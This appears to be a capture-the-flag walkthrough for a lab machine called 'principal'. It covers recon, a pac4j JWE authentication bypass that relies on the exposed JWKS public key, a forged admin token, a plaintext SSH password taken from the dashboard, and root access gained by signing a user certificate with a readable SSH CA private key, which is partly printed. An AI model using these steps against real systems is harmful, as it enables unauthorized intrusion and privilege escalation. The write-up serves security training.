```bash
============================================
  RECON SUMMARY
  Target:    10.129.15.146
  DNS:       none
  Generated: 2026-03-27 18:17:28
============================================

--------------------------------------------
  OPEN PORTS & SERVICES
--------------------------------------------
  22/tcp   ssh          OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
  8080/tcp http-proxy   Jetty

--------------------------------------------
  WEB PORTS
--------------------------------------------
  HTTP:   8080
  HTTPS:  none

--------------------------------------------
  SUBDOMAINS  (0 found)
--------------------------------------------
  none

--------------------------------------------
  INTERESTING PATHS
--------------------------------------------
  200  http://10.129.15.146:8080/dashboard
  200  http://10.129.15.146:8080/login
  200  http://10.129.15.146:8080/static/css/style.css
  200  http://10.129.15.146:8080/static/img/favicon.svg
  200  http://10.129.15.146:8080/static/js/app.js
  302  http://10.129.15.146:8080/login

============================================

=== Done! Results: /home/kali/github/ctf_tool/results/10.129.15.146/ ===
```
Ok so we did a recon scan on the machine. There is a website on port 8080. There is also ssh on port 22

If we visit the mainpage we can see that its a login screen 

```bash
v1.2.0 | Powered by pac4j
```

After reading the /static/js/app.js we can find that the API endpoint of /api/auth/jwks holds a public key.


```bash
curl 'http://10.129.15.146:8080/api/auth/jwks'
{"keys":[{"kty":"RSA","e":"AQAB","kid":"enc-key-1","n":"lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw"}]} 
```


https://www.codeant.ai/security-research/pac4j-jwt-authentication-bypass-public-key

Let's find a poc for this exploit.

After running the script we got the maliscious jwt

```bash
=== Malicious JWE Token ===

eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImN0eSI6ICJKV1QiLCAia2lkIjogImVuYy1rZXktMSJ9.jGFYLUsUd3X1ThacNyKjKhkclPNP9CxcCODPpconEQb0CD_qTofEDQnhKhksHE4I-oCXWqhBI_kdSBOk5aRTYCGx8bv3AaYZ23pY4K0p_JD9UEHZkk9sKTMduLAmKArFlAyJPsAESbJZETxXvYqKkIchpOvl-4zplbUwDBrXiVbOjd_8-hhg9a_tUBo59IHVVvkRfJMo-icoMKXwZlvK1H4U0Z067-zy4ZKyVVjljMNW7cLPUjsRgnAdDWo_u8B4bIdN9viH-o1WkIpUiSY172lLzCI68pA0H0xVrYeBH7Ukj0L6Wjb3HiqG2Xm4KRi5hAGQX_54NpHE-3QWF4nwTw.UMq3lKV35I69CAzY.szFse599ZJsSYMI-kWFGnROLs7MQm4cHuJ-hqMHXK-kGur_J-EpokTKlQ0XLV-oa6p87qtwL91hp2-0lVolAKtcqegZ5nwSenbyaWoyF6-a5inr5oWHVK4CD3Z6VzSrdaNtH0mHQ-wh_L0CN7B9mTGcS5-wK2jUifpxdKGiODE8nnbNHjqgmjYhFTIw1LgQFEQ7ni-PhhYQXG0rbXk3z7NI0d3k8-3652zBExmuCNgHNU3n60w.IFHTnziKTG5FM3rSJgflRw
```

Let's use it to login. Ok now we got access to the admin dashboard. 

We find credentials in the web appilcation.

```bash
D3pl0y_$$H_Now42!
```

There is a list of users. This seems the most reasonable to try
```bash
svc-deploy	Deploy Service	deployer	DevOps	Active	Service account for automated deployments via SSH certificate auth.
```

Ok we were able to log in and get the user.txt. Now we need to escalate our privileges.
```bash
svc-deploy@principal:~$ groups
svc-deploy deployers
svc-deploy@principal:~$ find /  -type f -group deployers -perm -g=r 2>/dev/null
/etc/ssh/sshd_config.d/60-principal.conf
/opt/principal/ssh/README.txt
/opt/principal/ssh/ca
```

Ok so we have sshd config files for principal.
And then we found a CA private key
```bash

cat ca
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEAupcTUsyUBVNyv9BSynItQWa/hy9VE0OOcvJ85btLVWghXJbhGWcj
7t8IAuF2whpooZvMMqAYCVyOgWckU6Ys5hyWQIzZr4vZ3FKEtOkaZfqAL/BNxroHXEKIJU
j+zXptCZ6Zh6Di/xbUrWij07aBGB1nN61XemARn1wqxdJRIBbEHMBTi5D6Et+SHZ2anI97
wbc+wLKHdqols7ZOpdlB42cq1ClMYkREV7K+7jbWPcUoANQpYWXcdzFBNYp7ZG1IHRQtcm
F0vpbL5VA/zeeGGC0ih+xlbDBc1f3FrMYMfM/Qn4A70vjNAVUaxohE5nGNYwCzk5Z+zwpy
5drwtUa9I+27bvfQ2Ky5mI+C/ToCox3l+yJ1UAhp6ER1qU4cqd1pnZ1qIIQIsgC7oi9/V1
0KXp9rexkHfs0+UG79h6S1uIblSl6GPttikm1bAIRQHsYGctOH8SmcOjOWM8yANvCVpyF3
Qm8XWIVZvEM5ZyhxISNidU//cK1LwRUEBMZl67fxx5iWa4zX45HeLVLGqy5QDSe4pTTDUs
5N0LiadrdiOyATuiTvHkLeYxBUj27SGr/bvLz7EyzEYzH66asYgAPlQKM83jmGSxIQlmr
```

Let's bring it over to our machine.

```bash
ssh-keygen -f id_rsa -N ""                     
Generating public/private ed25519 key pair.
id_rsa already exists.
Overwrite (y/n)? ^C
                                                                                                               
┌──(kali㉿kali)-[~/temp]
└─$ ssh-keygen -f attacker_key -N ""
Generating public/private ed25519 key pair.
Your identification has been saved in attacker_key
Your public key has been saved in attacker_key.pub
The key fingerprint is:
SHA256:P1TTZIQiqKQ2HQl3zQcHBYZ4nuq+DO4PAmZ26j6VEqU kali@kali
The key's randomart image is:
+--[ED25519 256]--+
|  ...o.===o  o+  |
|   o=.+.+.o .+   |
|  o+ = . o .o .  |
| E+ o o    . .   |
|.=.o..  S .      |
|=.oo.    o       |
|..=.      o      |
|.+ +.      .     |
|.++o=.           |
+----[SHA256]-----+
                                                                                                               
┌──(kali㉿kali)-[~/temp]
└─$ ls                              
attacker_key  attacker_key.pub  id_rsa
                                                                                                               
┌──(kali㉿kali)-[~/temp]
└─$ ssh-keygen -s id_rsa -I attacker -n root -V +52w attacker_key.pub
Signed user key attacker_key-cert.pub: id "attacker" serial 0 for root valid from 2026-04-25T13:53:00 to 2027-04-24T13:54:15
                                                                                                               
┌──(kali㉿kali)-[~/temp]
└─$ ssh -i attacker_key root@principal.htb                           
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

root@principal:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Suprisingly easy privesc for a medium machine.

So pretty much the server trust anything thats signed with the key. 

We then created a certificate not just the key. 

And then we were able to log in as root without any passwords since the config file said

```bash
# Principal machine SSH configuration
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

And here it's mentioned that "prohibit-password"
